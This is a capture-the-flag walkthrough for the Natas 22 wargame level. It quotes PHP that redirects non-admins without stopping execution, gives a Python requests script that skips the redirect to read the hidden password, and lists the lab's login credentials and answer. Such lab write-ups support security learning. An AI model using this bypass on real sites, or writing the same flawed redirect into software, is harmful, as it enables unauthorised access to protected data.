# Natas 21 - Natas 22
    Username  : natas22
    Password  : d8rwGBl0Xslg3b76ez3S7e1U8xwODGs8
    URL       : https://natas22.natas.labs.overthewire.org

# Solution
Looking at the source code:
```
if(array_key_exists("revelio", $_GET)) {
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
        header("Location: /");
    }
}
```
The page reveals the password if revelio parameter is set, but redirects non-admins. However, the password is printed before the redirect happens. We just need to not follow the redirect.

we can write a python script for that : 
```
import requests

url = "http://natas22.natas.labs.overthewire.org/?revelio=1"
auth = ("natas22", "d8rwGBl0Xslg3b76ez3S7e1U8xwODGs8")

r = requests.get(url, auth=auth, allow_redirects=False)
print(r.text)

```
# Password
    dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
